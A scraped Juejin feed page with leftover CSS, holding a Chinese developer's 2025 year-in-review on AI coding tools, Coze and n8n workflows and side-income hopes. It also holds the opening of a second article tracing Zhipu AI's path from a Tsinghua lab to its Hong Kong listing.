pre&gt;code::selection{background-color:var(--cyanosis-slct-prebg-color)}.markdown-body .contains-task-list{padding-left:14px;list-style:none}.markdown-body .contains-task-list input[type=checkbox]{position:relative}.markdown-body .contains-task-list input[type=checkbox]:before{content:"";position:absolute;top:0;left:0;right:0;bottom:0;width:inherit;height:inherit;background:#f0f8ff;border:1px solid #add6ff;border-radius:2px;box-sizing:border-box;z-index:1}.markdown-body .contains-task-list input[type=checkbox]:checked:after{content:"✓";position:absolute;top:-12px;left:0;right:0;bottom:0;width:0;height:0;color:#f55;font-size:20px;font-weight:700;z-index:2}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="atom-one-dark">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#abb2bf;background:#282c34}.hljs-comment,.hljs-quote{color:#5c6370;font-style:italic}.hljs-doctag,.hljs-formula,.hljs-keyword{color:#c678dd}.hljs-deletion,.hljs-name,.hljs-section,.hljs-selector-tag,.hljs-subst{color:#e06c75}.hljs-literal{color:#56b6c2}.hljs-addition,.hljs-attribute,.hljs-meta-string,.hljs-regexp,.hljs-string{color:#98c379}.hljs-built_in,.hljs-class .hljs-title{color:#e6c07b}.hljs-attr,.hljs-number,.hljs-selector-attr,.hljs-selector-class,.hljs-selector-pseudo,.hljs-template-variable,.hljs-type,.hljs-variable{color:#d19a66}.hljs-bullet,.hljs-link,.hljs-meta,.hljs-selector-id,.hljs-symbol,.hljs-title{color:#61aeee}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}.hljs-link{text-decoration:underline}</style><h3 data-id="heading-0">一 · 2025：我被 AI 推着往前走的一年</h3>
<p>大家好，我是卡卡。 我其实一直没有写个人总结的习惯，因为很多时候我都会觉得，自己的人生是很无趣的。好像就是把同一天重复过了 365 遍。没有什么特别大的惊喜，也谈不上有什么质的改变，唯一一直在往前走的，可能就只有年龄了。不过今年有点不一样，2025 年是我在掘金最活跃的一年，这次也算是借着征文的机会，回头记录一下属于自己的这一圈数字年轮。</p>
<p>如果要用一句话来概括 2025 年，那就是：<strong>这是我程序员近几年生涯里最轻松的一年，也是最忙碌的一年。</strong> 上半年很轻松，下半年却异常忙碌，而这两种看似相反的状态，其实都离不开同一个工具——AI。</p>
<p><strong>2025 年，我一边被 AI 解放（工作更轻松），一边被 AI 牵引（学习更忙碌）。</strong> 从最开始单纯用 AI 写代码、查问题、改 bug，到后来主动去学习 AI、研究工作流、搭流程、做验证、不断尝试新的方向。 回头看这一年，我也算是<strong>真实地体验了一把被时代推着往前走的感觉吧。</strong></p>
<hr/>
<h3 data-id="heading-1">二 · 写代码这件事，开始变轻松了</h3>
<p>最早接触 AI，其实还是从 ChatGPT 开始的。 对我来说，它就像是一位免费的、随时能问的全知全能老师，虽然有时候也会犯点低级错误，但对工作的帮助确实是实打实的。很多以前需要自己一点点查资料、翻文档、对着报错反复试的问题，现在只要把信息贴进去，就能很快拿到一个思路，知道该从哪下手。
<img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/b5d6c8a4d4674d0b941bfc4e993458e7~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5rSb5Y2h5Y2h5LqG:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768441804&amp;x-signature=huySxIpiyacsRl25ZbosCBYWrrM%3D" alt="" loading="lazy"/></p>
<p>后来我开始在代码工具里接入 GitHub Copilot，这种变化就更明显了。写代码的时候，我总是先写个注释，等着 AI 把代码补全，然后 Tab 回车。哪怕是很简单的功能，也懒得再手打一遍，慢慢地，甚至已经习惯了这种等补全的节奏。工作变得更轻松，遇到问题和 bug，也很少再去百度翻一堆方案，或者到处问同事，更不用说熬夜研究。</p>
<p>有时候想起以前的场景。为了定位一个问题，和我哥一起语音沟通熬了一个通宵，一行一行地看日志、试方案，第二天人是靠咖啡硬撑的。</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/f9f8a265e4f347f1a2d439ee3d177770~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5rSb5Y2h5Y2h5LqG:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768441804&amp;x-signature=hC5pusfRjIPMk%2FxlgvEv2Pdt3HQ%3D" alt="aaaaa" loading="lazy"/></p>
<p>而现在，大多数类似的问题，可能就是把报错贴给 AI，顺着给到的方向改一改，事情就结束了。那时候我还没意识到，这种“轻松”，其实只是一个开始。</p>
<hr/>
<h3 data-id="heading-2">三 · 当 AI 进了编辑器，我开始只要结果</h3>
<p>当 AI 真正进入代码编辑器之后，我写代码的方式彻底变了。 开始用上 Cursor、Trae 这些 AI 编辑器后，感觉和之前已经完全不是一个状态了。以前更多还是人写、AI 辅助，而现在更像是人给意图，AI 直接给结果。很多时候，我只需要简单描述一下要做什么，甚至连注释都懒得写清楚，剩下的就交给 AI 去补全、去改、去重构。</p>
<p>这种变化，其实是悄悄发生的。 一开始只是觉得快，后来慢慢变成了习惯。遇到问题，下意识就让 AI 直接给方案；代码不满意，就让它重写一版；逻辑有点乱，就让它顺一遍。以前还会自己一点点推演、验证，现在更多是在几个结果之间做选择。代码写得更快了，但人参与的方式，已经明显不一样了。</p>
<p><strong>以前还会享受一下解决问题的过程，现在只想要结果，过程好像也没那么重要了。</strong></p>
<hr/>
<h3 data-id="heading-3">四 · 轻松到一定程度，人反而开始空虚</h3>
<p>当解决问题不再需要我时，写代码这件事，反而开始变得无趣。 流程越来越顺，问题越来越少，很多事情几乎是丢给 AI 就结束。摸鱼的时间自然变长了，但人却并没有因此更轻松，反而常常是一种说不上来的空。感觉日子越来越无趣 不知道干什么。每天坐在电脑前，看着代码在跑、功能在交付，却很少再有那种“问题被我搞定了”的成就感，更多时候只是恍恍惚惚地把一天熬过去。</p>
<p>这种状态持续了一段时间之后，焦虑也慢慢浮了上来。 AI 让很多能力被快速拉平，原本需要经验堆出来的东西，现在几乎成了标配。都说AI拉近了菜鸟和大佬之间的距离，确实通过AI让我写出来之前根本写不出来的所谓的高质量，高性能代码，但同时也让我十年经验带来的优势开始变得模糊，再叠加行业环境和就业压力，这种不安会被不断放大。<strong>AI 拉近了菜鸟和大佬的距离，也让我开始重新怀疑自己的价值。</strong></p>
<hr/>
<h3 data-id="heading-4">五 · 唯一让我认真起来的，是每周那一篇总结</h3>
<p>那段时间里，唯一还能让我提起精神的，只剩下每周写一篇总结。 工作越来越顺，心却越来越慌。AI 拉平能力的速度远比我预想得快，十年经验带来的安全感在一点点被稀释，再加上行业环境持续收紧，这种不安会在日常里被不断放大。在这种状态下，写文章、做总结、做复盘，慢慢变成了一种自我校准的方式。不是为了输出给谁看，而是逼着自己把一周的思路重新捋一遍，确认自己是不是还在往前走。</p>
<p>我开始有意识地去写、去整理、去复盘，也开始尝试做一些以前不太敢碰的事情。借着 AI 的能力，去模拟、去拆解一些原本接触不到的技术架构，去验证自己的理解是不是还站得住脚。在 AI 几乎“全知全能”的背景下，这种主动思考和尝试，反而成了我确认自身技术判断的一种方式。<strong>似乎只有这样，日复一日的心理，才能得到一点点安慰。</strong></p>
<p>后来我发现一件挺重要的事。 这些每周写下来的总结，在 AI 的辅助下，慢慢变得更完整，也更容易坚持。AI 帮我整理结构、补全表达、把零散的想法捋清楚，但最终要不要写、写什么、写成什么样，还是得我自己来决定。也正是因为这样，我才能在那段状态并不算好的时间里，一直保持着相对稳定的输出。</p>
<p>直到年底知道自己被掘金评为「掘金 2025 年度优质作者」，也获得了一些粉丝，得到一些掘友们的认可。第一反应并不是兴奋，而是一种松了一口气的感觉。</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/9e6d11272b974f93a6d878ffc05d678a~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5rSb5Y2h5Y2h5LqG:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768441804&amp;x-signature=F6LDvdiJs6f6wiMUV0I8ne3MEbE%3D" alt="image-20260107152433981" loading="lazy"/></p>
<p>它并不意味着我做得有多好，但至少让我确认了一件事：在被 AI 推着往前走的这一年里，我每天花在整理、思考、记录上的时间，并没有被浪费。哪怕只是写文章这件事，也让我觉得，自己的日子并不是完全虚度的。</p>
<p>也正是在这些总结和复盘里，我开始反复思考一个问题： <strong>如果我只是停留在用 AI，那接下来，我到底该往哪走？</strong> 那时候的我还以为，自己对 AI 的期待，可能也只会停留在工作层面。</p>
<hr/>
<h3 data-id="heading-5">六 · 副业焦虑：想改变，但始终迈不出第一步</h3>
<p>我开始认真思考副业，但很快就发现，这条路并不轻松。 也许是程序员寒冬的影响，也许是每天摸鱼带来的空虚感，又或者是因为自己负债想多一份收入。总之，念头有了，行动却始终跟不上。要么觉得方向不好找，要么担心不靠谱，要么提不起兴趣，要么刚开始就发现很难坚持下去。总之理由一大堆，但结果始终没什么改变。</p>
<p>更现实的一点是，大多数人现在还是在上班，并不是独立开发者，也不是自由职业。在这种状态下去搞副业，往往会卡在两个很实际的问题上。第一个是太吃持续投入，需要长期、稳定地往里砸时间；第二个是学习成本高，而且一旦中断，就很难再接得上。我们经常看到别人分享剪视频、做漫画、写公众号，看起来好像都挺轻松，但真轮到自己上手才发现，每一个方向都需要不断学新东西、练手感、跟节奏。</p>
<p>更麻烦的是，当工作一忙，中断一段时间，再想捡起来，成本反而更高。与此同时，我们在投入这些时间的时候，其实也很难判断，这个方向到底能不能看到未来。久而久之，很多人还是会退回到最熟悉、也最省心的那条路上，在“想赚钱”“想短期变现”“又不想长期坚持”之间反复摇摆。<strong>我总是在“再等等”“不靠谱”“没兴趣”这些理由中来回横跳。</strong></p>
<hr/>
<h3 data-id="heading-6">七 · 朋友的公众号收入，第一次把副业拉回现实</h3>
<p>真正让我动心的，并不是哪篇教程，而是身边一个朋友的真实收入。 他一直在做公众号，记录自己的工作日记，很大众，很普通，粉丝也不算夸张，但运营得比较稳定，后来开通了流量主，每个月都会有收入，好的时候甚至能有好几千。不是暴富那种，但胜在清晰、可预期，也足够真实。</p>
<p>那一刻我心里其实是有波动的，就像是打开了一扇大门。 原来副业这件事，并不一定非要搞得多复杂，也不是只有极少数人才能做到。它第一次从“别人故事里的成功案例”，变成了一个发生在我身边的现实可能。我开始认真想，如果是我，能不能也试着走这条路。</p>
<p>但心动归心动，犹豫也同样真实。 我想做，却又很清楚自己的问题在哪——怕坚持不下去，怕热情来得快、退得也快，最后还是不了了之。<strong>我想做，但我更怕，自己又是三分钟热度。</strong></p>
<hr/>
<h3 data-id="heading-7">八 · 真正的转折点：我重新想起了“扣子工作流”</h3>
<p>直到有一天，我看到了一篇“一键仿爆款到草稿箱”的文章。 内容本身并不复杂，大概就是通过扣子工作流，把已经跑得不错的公众号文章抓下来，拆结构、定风格，然后直接生成一篇新的内容，丢进草稿箱。那一刻我突然想起来，自己其实早就听说过扣子工作流，只是之前一直没真正往心里去。</p>
<p>和写代码时那种提高效率的感觉又不太一样，这次让我震了一下的是： <strong>原来 AI 在非代码领域，同样可以这么有力量。</strong> 它不只是帮人写几行代码，而是可以参与到内容生产、流程拆解，甚至是整个创作链路里。那一刻我第一次很清晰地意识到，AI 可能并不是只服务于程序员的工具，它也许能帮我跨过一些原本完全不敢碰的领域。</p>
<p>真正开始动手学扣子工作流之后，这种感觉变得更明显了。我开始去学习创作各种各样的工作流：</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/b55f33e5f17c4f4b8bd6411255ef1232~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5rSb5Y2h5Y2h5LqG:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768441804&amp;x-signature=HTjbHYociJnPAGlvKYCqaGWOmTg%3D" alt="image-20260107154222082" loading="lazy"/></p>
<p>当我把第一条流程跑通之后，很多之前困扰我的问题突然变得不那么致命了。 比如能不能同时起多个公众号、不同方向要不要分开试、会不会一开始就把精力耗光。这些问题不再完全压在人要不要坚持上，而是被拆成了一个个流程节点，可以调整、可以复用、也可以随时停掉。</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/761732131f2948918b9f6e1364a5a139~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5rSb5Y2h5Y2h5LqG:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768441804&amp;x-signature=mqqG55nUKy3mxf9HWJKDDT2eyvs%3D" alt="image-20260107154337811" loading="lazy"/></p>
<p>当一条流程跑通之后，我发现很多以前想都不敢想的事，突然变得可以试一试了。比如同时起多个公众号，不同方向、不同风格，用同一套思路去跑；比如把内容生产这件事，从高消耗的灵感创作，变成一套可以反复执行、不断调整的流程。哪怕最后效果一般，也至少不用再被从零开始的成本劝退。</p>
<p>也正是从那一刻开始，我真正把注意力从“用 AI 写代码”，转向了“用 AI 搭流程、做验证”。 那一刻我也意识到，<strong>AI 不只是帮我把事情做得更快，它也在悄悄拓宽我能尝试的边界。</strong></p>
<hr/>
<h3 data-id="heading-8">九 · 从摸索到系统学习：我开始真正学 AI</h3>
<p>真正开始学 AI 之后，我才发现自己之前只是打开了一扇窗。 一开始完全是靠自己摸索，进度其实很慢，很多东西都是零零散散地试。后来我开始有意识地去找一些已经在这个领域里跑出来的大佬，去看他们是怎么做的，也顺带接触到了市面上大量关于副业和 AI 的内容。慢慢地，我也看清了一个现实：这类内容里，营销占了很大一部分，不是让你加群，就是把你往星球、私教里引，看起来很诱人，但多少也会让人警惕“割韭菜”。</p>
<p>以前我也常听一句话，说<strong>教你赚钱的人，赚的往往是你的钱，真正赚钱的人为什么要教你赚钱</strong>。后来我反而觉得，这句话只说对了一半。如果仔细去看那些真正把副业做起来的人，会发现他们大多都有一整套完整的路径和矩阵：先把某个技术方向跑通，再把经验整理出来输出，接着才是社群、星球、私教这些形式。从商业角度看，这条链路本身是成立的，而且逻辑也很清晰。</p>
<p>也正是基于这种认知，我慢慢接受了一件事： <strong>工作流做得再好，也只是工具，它只能降低学习成本，却不是变现的核心。真正决定能不能赚钱的，永远是商业化能力。</strong> 想走捷径、只靠白嫖，几乎是不现实的。但对我来说，与其纠结“会不会被割”，不如先承认一点——学习本身就是要付出代价的。至少在这个阶段，比起急着变现，我更在意的是把这条路看清楚、走扎实。</p>
<hr/>
<h3 data-id="heading-9">十· 视野被彻底打开：我才刚推开 AI 的一扇窗</h3>
<p>当我开始系统折腾 AI 之后，才发现自己之前看到的，其实只是冰山一角。 最初我还停留在扣子工作流这一层，但很快我就遇到了新的问题：如果流程再复杂一点，或者需要和外部系统打通，单靠扣子已经有些受限了。也正是在这个阶段，我开始接触并学习 <strong>n8n</strong>。</p>
<p>接触 n8n 之后，我的思路发生了一次明显变化。 它更偏工程化，也更自由，让我第一次开始认真思考：能不能把扣子工作流当成其中的一环，嵌进一条更大的自动化链路里。比如，用 n8n 负责调度、分发和对接接口，用扣子负责内容生成，把原本分散的能力，真正串成一条可以反复跑的流程。</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/111d2a73119a4963b69611b7d06728e4~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5rSb5Y2h5Y2h5LqG:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768441804&amp;x-signature=4CoucStc8dqoya3S7D00OFwloRo%3D" alt="image-20260107155752285" loading="lazy"/></p>
<p>随着每天下班回家不断学习和参考别人的实践，我才开始慢慢了解到，AI 的世界远不止一种形态。 除了 Coze 和 n8n 这样的工作流工具，图像生成也不只是简单点几下：即梦、LiblibAI、Nano Banana 各自有不同侧重；再往深一点，还有更底层、更自由的 ComfyUI；视频方向上，也开始出现像 <strong>Sora2</strong> 这样的能力突破；再加上数据编排、多维表格、各种 API 接口和成本对比，整个生态远比我一开始想象得要复杂得多。</p>
<p>但也正是这种复杂，让我第一次真正感到兴奋。 它不再是“学会一个工具就结束”的那种确定性，而是突然出现了一大片可以继续探索、拆解和组合的空间。每天都会冒出新的问题：这个能力能不能接到流程里？那个模型换掉会不会更合适？成本还能不能再压一压？我开始有一种很久没有过的感觉——<strong>好像又有东西值得我继续学下去了。</strong></p>
<p>也正是在这个阶段，我才逐渐意识到一个分歧点的存在。 也有同学会觉得，我们并不需要搭什么商业版图，只要会用工具变现就够了。现在网上 AI 工具一大把，想用什么直接搜、直接用，似乎也没必要自己去折腾，用 AI 去创造什么。</p>
<p>但越往下走，我反而越警惕一件事： 如果只停留在用现成工具，本质上我们用的，始终是别人的能力封装。工具怎么用、能力边界在哪、价值怎么分配，早就被别人设计好了。在这种情况下，看着别人吃肉，我们大概率连汤都很难喝到。能力边界不是自己定的，最后很容易就变成被收割的那一层人。</p>
<p>也正是意识到这一点，我才真正明白，自己这一阶段的“忙碌”从何而来。 不是因为工具变多了，而是我开始把被 AI 解放出来的时间，用来训练一件事——<strong>如何理解能力、组合能力，而不是只停留在使用层面。</strong> 直到这时我才意识到，自己或许真的只是刚刚推开了 AI 的一扇窗。</p>
<hr/>
<h3 data-id="heading-10">十一 · 回头看 2025：这就是我的 Vibe Coding 时刻</h3>
<p>回头看 2025 年，我觉得自己真正的转变，并不是用了多少 AI 工具。 这一年，AI 并没有让我躺平，反而让我变得更忙了。它把一部分重复、消耗的事情接了过去，也把我推向了另一类更难的事情——思考、判断、拆问题、搭流程、做验证。</p>
<p>从一开始用 AI 写代码、查问题，到后来开始学 AI、搭工作流，再到尝试把不同能力组合起来，我慢慢意识到，自己的角色正在发生变化。我不再只是被需求推着往前走的执行者，而是在不断做选择的人：选用什么能力、怎么组合、这条路值不值得继续试下去。</p>
<p>这大概就是我理解里的 Vibe Coding。 它不是偷懒，也不是少写代码，而是从“敲代码的人”，变成了“设计流程的人”。AI 让我写代码更轻松，也让我第一次有机会把精力花在更有价值的地方——把问题拆对，把流程搭对，把结果交付对。</p>
<p>最近刷到不少视频，都在说 2026 年可能是 AI 漫剧的顶峰，甚至是最后的风口。 我并不确定这种判断对不对，也不太想去赌所谓的“最后一次机会”。但至少在 2025 年，我已经不再只是围观这些变化，而是开始尝试理解它们、参与它们。哪怕只是从一个很小的方向开始，去学习、去验证、去创造属于自己的东西。</p>
<p>也许我现在还没有跑出什么确定或满意的结果。 但至少在这一年里，我第一次明确地感受到：<strong>我不再只是执行的人，而是在做判断和选择的人。</strong> 从用 AI，到学 AI，再到尝试搭 AI，这就是属于我的 2025 年——一个被 AI 解放、也被 AI 牵引着向前的 Vibe Coding 时刻。</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[智谱AI从清华实验室到“全球大模型第一股”的六年征程]]></title>    <link>https://juejin.cn/post/7592805973120811014</link>    <guid>https://juejin.cn/post/7592805973120811014</guid>    <pubDate>2026-01-08T10:03:28.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7592805973120811014" data-draft-id="7592805973120794630" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="智谱AI从清华实验室到“全球大模型第一股”的六年征程"/> <meta itemprop="keywords" content="后端"/> <meta itemprop="datePublished" content="2026-01-08T10:03:28.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="码事漫谈"/> <meta itemprop="url" content="https://juejin.cn/user/1972974802965230"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            智谱AI从清华实验室到“全球大模型第一股”的六年征程
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1972974802965230/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    码事漫谈
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-08T10:03:28.000Z" title="Thu Jan 08 2026 10:03:28 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-08
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读9分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><blockquote>
<p>港交所的上市钟声余音未绝，北京清华科技园的一间办公室里，创始人唐杰在内部信中写道：“我们不是敲钟，我们只是拿到了下一场硬仗的入场券。”</p>
</blockquote>
<p>2026年1月8日，智谱AI以每股116.20港元发行价登陆港交所主板，成为中国首家通用人工智能基座模型上市公司。</p>
<p>这家诞生于清华大学计算机系知识工程实验室的公司，用六年时间走过了从学术研究到产业落地的曲折道路。<strong>连续八轮融资累计超过83亿元</strong>，GLM系列模型已服务于<strong>超过1.2万家企业客户和8000万台终端设备</strong>。</p>
<hr/>
<h2 data-id="heading-0">01 起源</h2>
<p>2006年，清华大学知识工程实验室开始了名为 <strong>“AMiner”的科研情报挖掘系统</strong>的研究，这为智谱后来的发展埋下了第一颗种子。这个系统通过人工智能技术分析自然科学或技术发展的客观规律，构建了早期的知识图谱框架。</p>
<p>2019年6月，当北京智谱华章科技有限公司正式成立时，公司已非白手起家。<strong>技术积累从清华大学知识工程实验室直接转移</strong>，团队人员也大多来自同一学术背景，这让智谱在创业初期就拥有了一支扎实的技术团队。</p>
<p>公司最初主要为科技情报分析和数据挖掘提供解决方案，从成立第一天起就<strong>拥有稳定的收入来源</strong>，这种“自带干粮”的创业模式为大模型研发提供了宝贵的时间窗口。</p>
<h2 data-id="heading-1">02 抉择</h2>
<p>2020年GPT-3发布后，全球AI界为之震动。当时，<strong>追随西方主流架构是看起来最安全的选择</strong>，但智谱团队却选择了另一条道路。</p>
<p>“如果照搬西方技术，意味着永远只能跟随。”智谱CEO张鹏在早期访谈中表达了对自主创新的坚持。团队决定开发<strong>基于自回归填空的GLM预训练架构</strong>，这是一条充满未知的技术路径。</p>
<p>2021年4月，智源研究院以价值2037万元的知识产权完成对智谱的天使轮注资。同年，智谱便发布百亿参数模型GLM-10B，<strong>吸引了君联资本、启明创投等机构的关注</strong>，成功获得近2.1亿元的B1轮投资。这一步不仅解决了资金问题，也验证了技术路线的可行性。</p>
<h2 data-id="heading-2">03 开源</h2>
<p>2022年，智谱发布并开源了GLM-130B模型，这是国内<strong>首个千亿级开源模型</strong>，也是当年亚洲唯一入选斯坦福评测的全球主流大模型。</p>
<p>这次技术抢跑，让智谱在2023年开始的“百模大战”中占据了先机。</p>
<p>开源策略成为智谱撬动市场的重要杠杆。2023年，智谱率先开源ChatGLM-6B，<strong>将大模型的运行门槛降至普通笔记本电脑级别</strong>，吸引了大批开发者涌入生态。这种低门槛策略迅速扩大了智谱在开发者社区的影响力。</p>
<p>2025年，智谱将开源策略推向极致，宣布开源32B/9B系列模型，并采用对商业友好的MIT许可协议，允许企业免费商用。<strong>智谱的开源模型在全球下载量已超过6000万次</strong>，GitHub上相关开源项目超2000个，形成了中国大模型领域最活跃的开源生态之一。</p>
<h2 data-id="heading-3">04 商业化</h2>
<p>智谱的商业化路径体现了典型的技术公司转型过程。早期聚焦G端与B端市场，技术重心放在多模态模型与Agent智能体。</p>
<p>根据招股书披露，<strong>2025年上半年，智谱超过八成营收来源于为政府、金融、能源等大型客户提供本地化部署和定制化AI解决方案</strong>。这种模式带来可观的收入，但可持续性面临挑战：2022年至2025年上半年的前五大客户名单<strong>重复度极低</strong>，表明多数大客户合作仍停留在一次性交付层面。</p>
<p>智谱的MaaS模式正在形成新的商业化布局。To B端已拥有<strong>超过12000家企业客户</strong>，中国前十大互联网公司中有9家都在使用智谱GLM；To D端则聚集了<strong>270万开发者</strong>，API年收入增长超30倍。</p>
